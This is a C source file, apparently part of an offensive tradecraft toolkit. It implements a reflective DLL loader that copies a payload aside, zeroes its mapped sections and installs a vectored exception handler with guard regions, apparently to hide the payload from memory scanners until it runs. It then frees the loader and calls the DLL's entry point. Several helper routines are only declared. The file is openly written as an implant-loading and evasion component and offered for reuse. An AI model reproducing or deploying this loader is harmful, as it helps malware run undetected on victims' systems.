/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI PVOID WINAPI KERNEL32$AddVectoredExceptionHandler (ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

void        GuardExecInit();
LONG WINAPI GuardExecVEHHandler(EXCEPTION_POINTERS * pExceptionPointers);
void        GuardSections(DLLDATA * dll, char * dst, char * src);

/* globals we need for our free and run step */
char * loader;
char * dllEntry;
char * dllBase;

/* Set our guard exec shit up (exported function) */
void setup(char * _loader, DLLDATA * data, char * dstdll) {
	/* get our DLL size */
	int len = SizeOfDLL(data);

	/* initialize our GuardExec module */
	GuardExecInit();

	/* allocate our memory where our obfuscated, ready to restore, payload content will live */
	char * streamsrc = (char *)KERNEL32$VirtualAlloc( NULL, len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

	/* copy our payload content over to it! */
	memcpy(streamsrc, dstdll, len);

	/* set all of our sections to NULL, for now */
	memset(dstdll, 0, len);

	/* Now, we will walk the DLL, section by section, and setup guard regions and hints in our
	 * global table keeping track of these things */
	GuardSections(data, dstdll, streamsrc);

	/* install the handler as our global VEH */
	KERNEL32$AddVectoredExceptionHandler(FALSE, (PVECTORED_EXCEPTION_HANDLER)GuardExecVEHHandler);

	/* set some of our globals */
	dllEntry = (char *)EntryPoint(data, dstdll);
	dllBase  = dstdll;
	loader   = _loader;
}

void go() {
	/* free our loader */
	KERNEL32$VirtualFree(loader, 0, MEM_RELEASE);

	/* call the entry point of our Reflective DLL */
	((DLLMAIN_FUNC)dllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);

	/* exit the current thread.. else... we return to our free'd() memory and we don't want that. */
	KERNEL32$ExitThread(0);
}
